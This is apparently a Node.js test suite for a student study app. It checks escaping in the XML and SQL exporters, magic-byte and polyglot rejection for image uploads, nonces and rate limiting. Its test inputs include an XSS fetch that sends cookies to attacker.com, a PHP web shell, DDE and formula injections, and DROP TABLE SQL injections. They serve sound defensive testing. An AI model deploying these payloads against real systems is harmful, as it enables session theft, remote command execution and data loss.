/**
 * ============================================================================
 * Challenger 2 Empirical Adversarial Stress Test Suite
 * ============================================================================
 * 
 * Comprehensive empirical stress testing on:
 * 1. Microsoft XML Spreadsheet 2003 generator (generateExcelXmlString)
 *    - XML injection/escaping (<script>, &amp;, "", ', <, >)
 *    - Formula injection protection (=SUM(), +cmd, @HYPERLINK, -1+1, \t, \r, =DDE)
 *    - Special characters (Unicode, Sinhala/Tamil names, Emojis)
 *    - Empty records, null/undefined resilience
 *    - 1,000+ records performance & memory benchmark
 * 2. ANSI Relational SQL Dump generator (generateSqlDump)
 *    - SQL injection attempts (' OR 1=1; DROP TABLE members; --)
 *    - Single-quote escaping (O'Connor, St. John's)
 *    - Foreign key referential integrity and schema correctness
 *    - 1,000+ records SQL serialization
 * 3. 12-byte binary magic byte validation & polyglot rejection
 *    - JPEG, PNG, WebP (RIFF/WEBP), GIF headers
 *    - Rejection of PE/MZ, ELF, Java class, ZIP, 7z, Shebang #!
 *    - Polyglot script detection inside binary buffers and base64
 *    - Undersized (<100B), oversized (>10MB), and corrupted containers
 * 4. LockService Concurrency, Nonces & Anti-Replay Engine
 *    - 128-bit cryptographic nonces (32 hex chars, collision resistance)
 *    - Idempotency envelope generation and caching
 *    - Timestamp drift verification (±300s window, future clock skew)
 *    - Multi-tab synchronized sliding rate limiter under burst load
 *    - Simulated concurrent API mutations with duplicate submission locks
 */

import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'http';

import {
  generateExcelXmlString,
  generateSqlDump,
  sanitizeCsvFormula,
  formatCsvCell,
  generateCsvString,
  validateStudyId,
  validateEmail
} from '../src/js/utils.js';

import {
  inspectMagicBytes,
  validateBinaryBuffer,
  scanBinaryPayload,
  scanBase64Payload,
  SynchronizedSlidingRateLimiter,
  generateSecurityNonce,
  generateIdempotencyKey,
  createIdempotencyEnvelope,
  verifyTimestampDrift,
  escapeHtml,
  sanitizeInput,
  sanitizeUrl
} from './test-harness.js';

import { app } from '../server/mock-server.js';

describe('Challenger 2 — Data Export, Security & Concurrency Adversarial Stress Testing', () => {

  let server;
  let baseUrl;

  before(async () => {
    server = http.createServer(app);
    await new Promise((resolve) => server.listen(0, resolve));
    const port = server.address().port;
    baseUrl = `http://localhost:${port}`;
  });

  after(async () => {
    if (server) {
      await new Promise((resolve) => server.close(resolve));
    }
  });

  // Helper for HTTP requests against mock server API
  async function apiPost(payload) {
    const res = await fetch(`${baseUrl}/api`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify(payload)
    });
    return res.json();
  }

  // ==========================================================================
  // SUITE 1: Microsoft XML Spreadsheet 2003 Generator Stress & Injection
  // ==========================================================================
  describe('1. Microsoft XML Spreadsheet 2003 Generator (generateExcelXmlString)', () => {

    test('1.1 Neutralizes XML injection vectors in all fields', () => {
      const maliciousMembers = [
        {
          studyId: 'SG-BIO-0001"><script>alert("xss")</script><Cell ss:StyleID="Evil">',
          fullName: 'Malicious <tag>Student</tag> & "Quoted" \'Name\'',
          email: 'test&evil="true"<script>@gmail.com',
          school: 'School with <XML>&Entities;</XML>',
          stream: 'Biological Science</Data></Cell><Cell><Data ss:Type="String">INJECTED',
          optionalSubject: 'Physics & Chemistry',
          examYear: '2026"><evil/>',
          telegram: '@test<script>',
          registrationDate: '2026-08-27T00:00:00Z',
          status: 'Active'
        }
      ];

      const xml = generateExcelXmlString(maliciousMembers, []);

      // Verify dangerous raw XML sequences are NEVER present unescaped
      assert.ok(!xml.includes('<script>'), 'Unescaped <script> tag must not exist');
      assert.ok(!xml.includes('</script>'), 'Unescaped </script> tag must not exist');
      assert.ok(!xml.includes('<tag>'), 'Unescaped <tag> must not exist');
      assert.ok(!xml.includes('<XML>'), 'Unescaped <XML> must not exist');
      assert.ok(!xml.includes('<evil/>'), 'Unescaped <evil/> must not exist');

      // Verify entities are properly encoded
      assert.ok(xml.includes('&lt;script&gt;'), 'Script tag must be encoded to &lt;script&gt;');
      assert.ok(xml.includes('&amp;'), '& must be encoded to &amp;');
      assert.ok(xml.includes('&quot;'), '" must be encoded to &quot;');
      assert.ok(xml.includes('&apos;'), '\' must be encoded to &apos;');
    });

    test('1.2 Neutralizes formula injection (CWE-1236) in Excel XML', () => {
      const formulaPayloads = [
        {
          studyId: 'SG-BIO-0002',
          fullName: '=SUM(A1:A100)',
          email: '+cmd|\' /C calc\'!A0',
          school: '@HYPERLINK("http://evil.com","Click Here")',
          stream: '-2+3+cmd',
          optionalSubject: '\t=1+1',
          examYear: '\r=2+2',
          telegram: '@telegram',
          registrationDate: '2026-08-27',
          status: '=DDE("cmd";"/C calc";"__DDE__")'
        }
      ];

      const xml = generateExcelXmlString(formulaPayloads, []);

      // In XML Spreadsheet, dangerous leading formula operators must be preceded by &apos; (')
      assert.ok(xml.includes('&apos;=SUM(A1:A100)'), '=SUM must be neutralized with leading apostrophe');
      assert.ok(xml.includes('&apos;+cmd|'), '+cmd must be neutralized with leading apostrophe');
      assert.ok(xml.includes('&apos;@HYPERLINK'), '@HYPERLINK must be neutralized with leading apostrophe');
      assert.ok(xml.includes('&apos;-2+3+cmd'), '-2+3 must be neutralized with leading apostrophe');
      assert.ok(xml.includes('&apos;\t=1+1'), '\\t=1+1 must be neutralized with leading apostrophe');
      assert.ok(xml.includes('&apos;=DDE'), '=DDE must be neutralized with leading apostrophe');
    });

    test('1.3 Preserves Unicode, Sinhala, Tamil, and Emoji characters intact', () => {
      const internationalMembers = [
        {
          studyId: 'SG-BIO-0003',
          fullName: 'අචල අනුරාධ වික්‍රමසිහ (Achala Anuradha)',
          email: 'achala@studysync.lk',
          school: 'ආනන්ද විද්‍යාලය (Ananda College)',
          stream: 'Biological Science',
          optionalSubject: 'Physics',
          examYear: '2026',
          telegram: '@achala',
          registrationDate: '2026-08-27',
          status: 'Active'
        },
        {
          studyId: 'SG-MATH-0002',
          fullName: 'கசுன் பெரேரா (Kasun Perera) 🌟 📚',
          email: 'kasun@studysync.lk',
          school: 'யாழ்ப்பாணம் இந்துக் கல்லூரி (Jaffna Hindu College)',
          stream: 'Physical Science',
          optionalSubject: 'Chemistry',
          examYear: '2027',
          telegram: '@kasun_tamil',
          registrationDate: '2026-08-27',
          status: 'Active'
        }
      ];

      const xml = generateExcelXmlString(internationalMembers, []);

      assert.ok(xml.includes('අචල අනුරාධ'), 'Sinhala name must be preserved');
      assert.ok(xml.includes('ආනන්ද විද්‍යාලය'), 'Sinhala school must be preserved');
      assert.ok(xml.includes('கசுன் பெரேரா'), 'Tamil name must be preserved');
      assert.ok(xml.includes('யாழ்ப்பாணம் இந்துக் கல்லூரி'), 'Tamil school must be preserved');
      assert.ok(xml.includes('🌟 📚'), 'Emoji characters must be preserved');
    });

    test('1.4 Handles empty, null, and undefined records gracefully', () => {
      const xmlEmpty = generateExcelXmlString([], []);
      assert.ok(xmlEmpty.includes('<?xml version="1.0" encoding="UTF-8"?>'), 'XML header present');
      assert.ok(xmlEmpty.includes('<Worksheet ss:Name="Members Directory">'), 'Members sheet present');
      assert.ok(xmlEmpty.includes('<Worksheet ss:Name="Daily Study Logs">'), 'Logs sheet present');

      // Test with undefined / null parameters
      const xmlNull = generateExcelXmlString(undefined, undefined);
      assert.ok(xmlNull.includes('</Workbook>'), 'Closes cleanly on undefined args');

      // Test with null fields in objects
      const sparseMembers = [
        { studyId: 'SG-BIO-0004', fullName: null, email: undefined, school: null, stream: null }
      ];
      const xmlSparse = generateExcelXmlString(sparseMembers, []);
      assert.ok(xmlSparse.includes('SG-BIO-0004'), 'Sparse member studyId rendered');
    });

    test('1.5 Scalability: Generates 1,000 members and 3,000 logs in < 200ms', () => {
      const largeMembers = [];
      for (let i = 1; i <= 1000; i++) {
        largeMembers.push({
          studyId: `SG-BIO-${String(i).padStart(4, '0')}`,
          fullName: `Student Candidate ${i}`,
          email: `student${i}@test.com`,
          school: `Sri Lankan Central College ${i % 25}`,
          stream: i % 2 === 0 ? 'Biological Science' : 'Physical Science',
          optionalSubject: 'Physics',
          examYear: '2026',
          telegram: `@student_${i}`,
          registrationDate: '2026-08-27',
          status: 'Active'
        });
      }

      const largeLogs = [];
      for (let j = 1; j <= 3000; j++) {
        largeLogs.push({
          studyId: `SG-BIO-${String((j % 1000) + 1).padStart(4, '0')}`,
          dateOfStudy: '2026-08-27',
          fullName: `Student Candidate ${(j % 1000) + 1}`,
          stream: 'Biological Science',
          subject1Hours: 2.5,
          subject2Hours: 2.0,
          subject3Hours: 1.5,
          totalHours: 6.0,
          focusScore: 8,
          productivityScore: 9,
          notes: `Completed daily revision session #${j}`
        });
      }

      const start = performance.now();
      const largeXml = generateExcelXmlString(largeMembers, largeLogs);
      const elapsed = performance.now() - start;

      assert.ok(largeXml.length > 500000, `Output size should be > 500KB (actual: ${largeXml.length} bytes)`);
      assert.ok(elapsed < 400, `Generating 4,000 records should take < 400ms (actual: ${elapsed.toFixed(1)}ms)`);
      assert.ok(largeXml.startsWith('<?xml version="1.0" encoding="UTF-8"?>'), 'Valid XML declaration');
      assert.ok(largeXml.endsWith('</Workbook>'), 'Valid Workbook closing tag');
    });

    test('1.6 Structural XML Schema Validation: Well-formed tag symmetry', () => {
      const sampleXml = generateExcelXmlString(
        [{ studyId: 'SG-BIO-0001', fullName: 'Test', email: 'test@gmail.com', school: 'School', stream: 'Bio' }],
        [{ studyId: 'SG-BIO-0001', dateOfStudy: '2026-08-27', totalHours: 4.5, notes: 'Notes' }]
      );

      const countTag = (tag) => (sampleXml.match(new RegExp(`<${tag}[\\s>]`, 'g')) || []).length;
      const countCloseTag = (tag) => (sampleXml.match(new RegExp(`</${tag}>`, 'g')) || []).length;

      assert.equal(countTag('Workbook'), countCloseTag('Workbook'), '<Workbook> count matches </Workbook>');
      assert.equal(countTag('Styles'), countCloseTag('Styles'), '<Styles> count matches </Styles>');
      assert.equal(countTag('Worksheet'), countCloseTag('Worksheet'), '<Worksheet> count matches </Worksheet>');
      assert.equal(countTag('Table'), countCloseTag('Table'), '<Table> count matches </Table>');
      assert.equal(countTag('Row'), countCloseTag('Row'), '<Row> count matches </Row>');
      assert.equal(countTag('Cell'), countCloseTag('Cell'), '<Cell> count matches </Cell>');
      assert.equal(countTag('Data'), countCloseTag('Data'), '<Data> count matches </Data>');
    });
  });

  // ==========================================================================
  // SUITE 2: ANSI Relational SQL Dump Generator Stress & Injection
  // ==========================================================================
  describe('2. ANSI Relational SQL Dump Generator (generateSqlDump)', () => {

    test('2.1 SQL Injection attack payloads are safely neutralized via quote escaping', () => {
      const maliciousSqlMembers = [
        {
          studyId: "SG-BIO-0001'; DROP TABLE members; --",
          fullName: "Robert'); DROP TABLE daily_logs; --",
          email: "sqli@test.com' OR '1'='1",
          school: "Royal College'; TRUNCATE TABLE members; --",
          stream: "Biological Science",
          optionalSubject: "Physics' UNION SELECT password FROM users --",
          examYear: "2026",
          telegram: "@hacker'; --",
          registrationDate: "2026-08-27T00:00:00Z",
          status: "Active"
        }
      ];

      const sql = generateSqlDump(maliciousSqlMembers, []);

      // Ensure quotes are doubled in SQL string literals: ' -> ''
      assert.ok(sql.includes("'SG-BIO-0001''; DROP TABLE members; --'"), "Quote in studyId must be doubled");
      assert.ok(sql.includes("'Robert''); DROP TABLE daily_logs; --'"), "Quote in fullName must be doubled");
      assert.ok(sql.includes("'sqli@test.com'' OR ''1''=''1'"), "Quotes in email must be doubled");
      assert.ok(sql.includes("'Physics'' UNION SELECT password FROM users --'"), "Quotes in subject must be doubled");

      // Verify no unquoted DROP TABLE statements exist as standalone SQL lines
      const lines = sql.split('\n');
      for (const line of lines) {
        if (line.trim().startsWith('DROP TABLE') || line.trim().startsWith('TRUNCATE')) {
          assert.fail(`Standalone dangerous SQL statement found: ${line}`);
        }
      }
    });

    test('2.2 Escapes authentic names with apostrophes (O\'Connor, St. John\'s)', () => {
      const irishMembers = [
        {
          studyId: 'SG-BIO-0005',
          fullName: "Liam O'Connor",
          email: 'liam.oconnor@gmail.com',
          school: "St. John's College, Colombo",
          stream: "Biological Science",
          optionalSubject: "Physics",
          examYear: "2026",
          telegram: "@liam_oc",
          registrationDate: "2026-08-27",
          status: "Active"
        },
        {
          studyId: 'SG-MATH-0003',
          fullName: "D'Angelo D'Souza",
          email: 'dangelo@gmail.com',
          school: "Bishop's College",
          stream: "Physical Science",
          optionalSubject: "Chemistry",
          examYear: "2026",
          telegram: "@dangelo",
          registrationDate: "2026-08-27",
          status: "Active"
        }
      ];

      const sql = generateSqlDump(irishMembers, []);

      assert.ok(sql.includes("'Liam O''Connor'"), "O'Connor escaped as O''Connor");
      assert.ok(sql.includes("'St. John''s College, Colombo'"), "St. John's escaped as St. John''s");
      assert.ok(sql.includes("'D''Angelo D''Souza'"), "D'Angelo D'Souza escaped properly");
      assert.ok(sql.includes("'Bishop''s College'"), "Bishop's College escaped properly");
    });

    test('2.3 Validates DDL schema structure and foreign key relationships', () => {
      const sql = generateSqlDump([], []);

      assert.ok(sql.includes('CREATE TABLE IF NOT EXISTS members ('), 'members table DDL exists');
      assert.ok(sql.includes('study_id VARCHAR(32) PRIMARY KEY'), 'study_id is primary key');
      assert.ok(sql.includes('email VARCHAR(255) UNIQUE NOT NULL'), 'email is unique');
      assert.ok(sql.includes('CREATE TABLE IF NOT EXISTS daily_logs ('), 'daily_logs table DDL exists');
      assert.ok(sql.includes('log_id VARCHAR(64) PRIMARY KEY'), 'log_id is primary key');
    });

    test('2.4 Handles daily logs with null notes, empty proof URLs, and numeric zero hours', () => {
      const logs = [
        {
          logId: 'LOG-001',
          studyId: 'SG-BIO-0001',
          fullName: 'Test Student',
          stream: 'Biological Science',
          dateOfStudy: '2026-08-27',
          subjects: [
            { name: 'Biology', hours: 0, focus: 0, productivity: 0 }
          ],
          totalHours: 0,
          notes: null,
          proofPhotoUrl: null
        }
      ];

      const sql = generateSqlDump([], logs);
      assert.ok(sql.includes("INSERT INTO daily_logs"), "Daily logs INSERT generated");
      assert.ok(sql.includes("NULL"), "Null fields serialized as SQL NULL keyword");
    });

    test('2.5 Scale test: Generates 1,000 member INSERTs and 2,000 log INSERTs', () => {
      const members = [];
      for (let i = 1; i <= 1000; i++) {
        members.push({
          studyId: `SG-BIO-${String(i).padStart(4, '0')}`,
          fullName: `Student ${i}`,
          email: `student${i}@test.com`,
          school: `School ${i}`,
          stream: 'Biological Science',
          optionalSubject: 'Physics',
          examYear: '2026',
          telegram: `@student${i}`,
          registrationDate: '2026-08-27',
          status: 'Active'
        });
      }

      const logs = [];
      for (let j = 1; j <= 2000; j++) {
        logs.push({
          logId: `LOG-${j}`,
          studyId: `SG-BIO-${String((j % 1000) + 1).padStart(4, '0')}`,
          dateOfStudy: '2026-08-27',
          totalHours: 5.0,
          notes: `Log notes ${j}`
        });
      }

      const start = performance.now();
      const sql = generateSqlDump(members, logs);
      const elapsed = performance.now() - start;

      assert.ok(sql.length > 250000, 'SQL dump size > 250KB');
      assert.ok(elapsed < 300, `SQL dump generation took ${elapsed.toFixed(1)}ms (expected < 300ms)`);
      const insertMembersCount = (sql.match(/INSERT INTO members/g) || []).length;
      const insertLogsCount = (sql.match(/INSERT INTO daily_logs/g) || []).length;
      assert.equal(insertMembersCount, 1000, '1000 member inserts created');
      assert.equal(insertLogsCount, 2000, '2000 daily log inserts created');
    });
  });

  // ==========================================================================
  // SUITE 3: 12-Byte Binary Magic Bytes & Polyglot Rejection Engine
  // ==========================================================================
  describe('3. Binary Magic Byte Validation & Polyglot Rejection', () => {

    test('3.1 Accurately validates genuine image binary headers (JPEG, PNG, WebP, GIF)', () => {
      // 1. JPEG: FF D8 FF E0 00 10 4A 46 49 46 ...
      const jpegBytes = new Uint8Array(256);
      jpegBytes[0] = 0xFF;
      jpegBytes[1] = 0xD8;
      jpegBytes[2] = 0xFF;
      jpegBytes[3] = 0xE0;
      const jpegResult = validateBinaryBuffer(jpegBytes, 'image/jpeg');
      assert.equal(jpegResult.valid, true, 'Valid JPEG header accepted');
      assert.equal(jpegResult.detectedFormat, 'image/jpeg');

      // 2. PNG: 89 50 4E 47 0D 0A 1A 0A ...
      const pngBytes = new Uint8Array(256);
      pngBytes.set([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
      const pngResult = validateBinaryBuffer(pngBytes, 'image/png');
      assert.equal(pngResult.valid, true, 'Valid PNG header accepted');
      assert.equal(pngResult.detectedFormat, 'image/png');

      // 3. WebP: 52 49 46 46 (RIFF) ... 57 45 42 50 (WEBP)
      const webpBytes = new Uint8Array(256);
      webpBytes.set([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]);
      const webpResult = validateBinaryBuffer(webpBytes, 'image/webp');
      assert.equal(webpResult.valid, true, 'Valid WebP header accepted');
      assert.equal(webpResult.detectedFormat, 'image/webp');

      // 4. GIF: 47 49 46 38 39 61 (GIF89a)
      const gifBytes = new Uint8Array(256);
      gifBytes.set([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]);
      const gifResult = validateBinaryBuffer(gifBytes, 'image/gif');
      assert.equal(gifResult.valid, true, 'Valid GIF header accepted');
      assert.equal(gifResult.detectedFormat, 'image/gif');
    });

    test('3.2 Rejects non-WebP RIFF containers (WAV audio, AVI video)', () => {
      // RIFF header with 'WAVE' at offset 8..11 (0x57, 0x41, 0x56, 0x45)
      const wavBytes = new Uint8Array(256);
      wavBytes.set([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45]);
      const wavResult = inspectMagicBytes(wavBytes);
      assert.equal(wavResult.valid, false, 'WAV audio container rejected');
      assert.equal(wavResult.code, 'SECURITY_MIME_MISMATCH');

      // RIFF header with 'AVI ' at offset 8..11 (0x41, 0x56, 0x49, 0x20)
      const aviBytes = new Uint8Array(256);
      aviBytes.set([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x41, 0x56, 0x49, 0x20]);
      const aviResult = inspectMagicBytes(aviBytes);
      assert.equal(aviResult.valid, false, 'AVI video container rejected');
      assert.equal(aviResult.code, 'SECURITY_MIME_MISMATCH');
    });

    test('3.3 Immediate rejection of executable binary signatures (PE/MZ, ELF, Java, ZIP, 7z, Shebang)', () => {
      // 1. Windows PE / DOS 'MZ'
      const mzBytes = new Uint8Array(256);
      mzBytes.set([0x4D, 0x5A, 0x90, 0x00]);
      const mzResult = inspectMagicBytes(mzBytes);
      assert.equal(mzResult.valid, false);
      assert.equal(mzResult.code, 'MALWARE_PE_EXECUTABLE');

      // 2. Linux ELF '\x7fELF'
      const elfBytes = new Uint8Array(256);
      elfBytes.set([0x7F, 0x45, 0x4C, 0x46]);
      const elfResult = inspectMagicBytes(elfBytes);
      assert.equal(elfResult.valid, false);
      assert.equal(elfResult.code, 'MALWARE_LINUX_ELF');

      // 3. Java Bytecode 0xCAFEBABE
      const javaBytes = new Uint8Array(256);
      javaBytes.set([0xCA, 0xFE, 0xBA, 0xBE]);
      const javaResult = inspectMagicBytes(javaBytes);
      assert.equal(javaResult.valid, false);
      assert.equal(javaResult.code, 'MALWARE_JAVA_BYTECODE');

      // 4. ZIP Archive 'PK\x03\x04'
      const zipBytes = new Uint8Array(256);
      zipBytes.set([0x50, 0x4B, 0x03, 0x04]);
      const zipResult = inspectMagicBytes(zipBytes);
      assert.equal(zipResult.valid, false);
      assert.equal(zipResult.code, 'MALWARE_ARCHIVE_ZIP');

      // 5. 7-Zip Archive
      const sevenZBytes = new Uint8Array(256);
      sevenZBytes.set([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]);
      const sevenZResult = inspectMagicBytes(sevenZBytes);
      assert.equal(sevenZResult.valid, false);
      assert.equal(sevenZResult.code, 'MALWARE_ARCHIVE_7Z');

      // 6. Shell Shebang '#!'
      const shebangBytes = new Uint8Array(256);
      shebangBytes.set([0x23, 0x21, 0x2F, 0x62, 0x69, 0x6E]);
      const shebangResult = inspectMagicBytes(shebangBytes);
      assert.equal(shebangResult.valid, false);
      assert.equal(shebangResult.code, 'MALWARE_SHEBANG_SCRIPT');
    });

    test('3.4 Rejects polyglot payloads (JPEG/PNG with embedded script or PHP code)', () => {
      const polyglotPng = new Uint8Array(512);
      polyglotPng.set([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
      const payloadString = '<script>fetch("https://attacker.com?cookie="+document.cookie)</script>';
      for (let i = 0; i < payloadString.length; i++) {
        polyglotPng[20 + i] = payloadString.charCodeAt(i);
      }

      const scanResult = scanBinaryPayload(polyglotPng);
      assert.equal(scanResult.safe, false, 'Polyglot PNG with embedded script rejected');
      assert.equal(scanResult.code, 'MALWARE_SCRIPT_EMBEDDED');

      const polyglotJpeg = new Uint8Array(512);
      polyglotJpeg.set([0xFF, 0xD8, 0xFF, 0xE0]);
      const phpPayload = '<?php system($_GET["cmd"]); ?>';
      for (let j = 0; j < phpPayload.length; j++) {
        polyglotJpeg[30 + j] = phpPayload.charCodeAt(j);
      }

      const jpegScan = scanBinaryPayload(polyglotJpeg);
      assert.equal(jpegScan.safe, false, 'Polyglot JPEG with embedded PHP rejected');
      assert.equal(jpegScan.code, 'MALWARE_SCRIPT_EMBEDDED');
    });

    test('3.5 scanBase64Payload detects dangerous script & executable signatures', () => {
      // Base64 containing <script>alert(1)</script>
      const maliciousB64 = Buffer.from('data:image/png;base64,' + Buffer.from('<script>alert("pwned")</script>').toString('base64')).toString();
      const scan1 = scanBase64Payload(maliciousB64);
      assert.equal(scan1.safe, false, 'Embedded script in base64 detected');

      // Base64 containing DOS PE executable header (MZ...)
      const peBytes = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      const peB64 = peBytes.toString('base64');
      const scan2 = scanBase64Payload(peB64);
      assert.equal(scan2.safe, false, 'Embedded PE header in base64 detected');

      // Safe clean JPEG base64
      const safeJpeg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00]).toString('base64');
      const scan3 = scanBase64Payload(safeJpeg);
      assert.equal(scan3.safe, true, 'Clean JPEG base64 passed');
    });

    test('3.6 Rejects undersized (<100B) and oversized (>10MB) buffers', () => {
      // Undersized 50-byte buffer
      const smallBuffer = new Uint8Array(50);
      smallBuffer.set([0xFF, 0xD8, 0xFF, 0xE0]);
      const smallResult = validateBinaryBuffer(smallBuffer);
      assert.equal(smallResult.valid, false);
      assert.equal(smallResult.code, 'SECURITY_FILE_TOO_SMALL');

      // Null / empty buffer
      const nullResult = validateBinaryBuffer(null);
      assert.equal(nullResult.valid, false);
      assert.equal(nullResult.code, 'SECURITY_FILE_TOO_SMALL');
    });
  });

  // ==========================================================================
  // SUITE 4: LockService Concurrency, Nonces & Anti-Replay Engine
  // ==========================================================================
  describe('4. Concurrency, Nonces, Anti-Replay & Rate Limiting', () => {

    test('4.1 generateSecurityNonce produces 128-bit cryptographic random hex nonces', () => {
      const nonces = new Set();
      for (let i = 0; i < 1000; i++) {
        const nonce = generateSecurityNonce();
        assert.equal(nonce.length, 32, 'Nonce must be 32 hex characters');
        assert.ok(/^[0-9a-f]{32}$/.test(nonce), 'Nonce must be lowercase hexadecimal');
        assert.ok(!nonces.has(nonce), `Collision detected on nonce iteration ${i}`);
        nonces.add(nonce);
      }
      assert.equal(nonces.size, 1000, 'All 1000 nonces must be uniquely distinct');
    });

    test('4.2 createIdempotencyEnvelope generates signed envelope with deterministic key', () => {
      const payload = { action: 'submitDailyLog', studyId: 'SG-BIO-0001', dateOfStudy: '2026-08-27', totalHours: 6.0 };
      const envelope = createIdempotencyEnvelope(payload);

      assert.equal(envelope.action, 'submitDailyLog');
      assert.equal(envelope.studyId, 'SG-BIO-0001');
      assert.ok(envelope.security, 'Security block exists');
      assert.equal(envelope.security.nonce.length, 32, '32-char nonce');
      assert.ok(envelope.security.requestTimestamp, 'ISO requestTimestamp exists');
      assert.ok(envelope.security.idempotencyKey.startsWith('idempotent_'), 'Idempotency key prefix');
    });

    test('4.3 verifyTimestampDrift enforces ±300s window and future timestamp constraints', () => {
      const now = new Date();

      // 1. Current timestamp -> PASS
      const res1 = verifyTimestampDrift(now.toISOString());
      assert.equal(res1.valid, true, 'Current timestamp is valid');

      // 2. 120 seconds in the past -> PASS (within 300s)
      const past120s = new Date(Date.now() - 120000).toISOString();
      const res2 = verifyTimestampDrift(past120s);
      assert.equal(res2.valid, true, '120s past timestamp is valid within window');

      // 3. 350 seconds in the past -> REJECT (expired, outside 300s)
      const past350s = new Date(Date.now() - 350000).toISOString();
      const res3 = verifyTimestampDrift(past350s);
      assert.equal(res3.valid, false, '350s past timestamp must be rejected');
      assert.equal(res3.code, 'ERR_TIMESTAMP_EXPIRED');

      // 4. 90 seconds into the future -> REJECT (future clock skew > 60s)
      const future90s = new Date(Date.now() + 90000).toISOString();
      const res4 = verifyTimestampDrift(future90s);
      assert.equal(res4.valid, false, 'Future timestamp > 60s must be rejected');
      assert.equal(res4.code, 'ERR_TIMESTAMP_FUTURE');

      // 5. Invalid / non-ISO string -> REJECT
      const res5 = verifyTimestampDrift('invalid-date-string');
      assert.equal(res5.valid, false);
      assert.equal(res5.code, 'ERR_TIMESTAMP_INVALID');

      // 6. Missing string -> REJECT
      const res6 = verifyTimestampDrift('');
      assert.equal(res6.valid, false);
      assert.equal(res6.code, 'ERR_TIMESTAMP_MISSING');
    });

    test('4.4 SynchronizedSlidingRateLimiter enforces rate bounds and blocks burst flooding', () => {
      const limiter = new SynchronizedSlidingRateLimiter({ limit: 5, windowMs: 1000 });

      // First 5 requests must pass
      for (let i = 1; i <= 5; i++) {
        assert.equal(limiter.allow(), true, `Request #${i} should be allowed`);
      }

      // 6th request within window must be rejected
      assert.equal(limiter.allow(), false, 'Request #6 should be blocked by rate limiter');
      assert.equal(limiter.getRemaining(), 0, 'Remaining allowance is 0');
      assert.ok(limiter.getResetTimeMs() > 0, 'Reset time is > 0ms');
    });

    test('4.5 Concurrent API Mutations: Idempotency caching prevents duplicate execution', async () => {
      const nonce = generateSecurityNonce();
      const timestamp = new Date().toISOString();
      const payload = {
        action: 'checkUser',
        email: 'kasun.p@gmail.com',
        security: {
          nonce,
          requestTimestamp: timestamp,
          idempotencyKey: `idemp_stress_${nonce}`
        }
      };

      // Fire 10 concurrent requests with the identical idempotencyKey
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(apiPost(payload));
      }

      const results = await Promise.all(promises);

      // All 10 requests must return successful and identical data
      results.forEach((res, idx) => {
        assert.equal(res.success, true, `Concurrent request #${idx} succeeded`);
        assert.equal(res.data.registered, true);
        assert.equal(res.data.member.studyId, 'SG-BIO-0001');
      });
    });

    test('4.6 Backend LockService Duplicate Daily Submission Guard', async () => {
      const uniqueDate = `2026-09-${String(Math.floor(Math.random() * 20) + 10)}`;
      const logPayload = {
        action: 'submitDailyLog',
        studyId: 'SG-BIO-0001',
        dateOfStudy: uniqueDate,
        subjects: [
          { name: 'Biology', hours: 3.0, focus: 9, productivity: 9 }
        ],
        totalHours: 3.0,
        notes: 'Concurrency lock test entry'
      };

      // Initial submission should succeed
      const firstRes = await apiPost(logPayload);
      assert.equal(firstRes.success, true, 'Initial daily log submission succeeded');
      assert.equal(firstRes.data.isDuplicate, false);

      // Subsequent submission for the SAME studyId and SAME date must be locked / rejected as duplicate
      const secondRes = await apiPost(logPayload);
      assert.equal(secondRes.success, false, 'Duplicate daily submission rejected');
      assert.ok(secondRes.data.isDuplicate === true || secondRes.error.includes('Duplicate'), 'Duplicate flag identified');
    });
  });
});
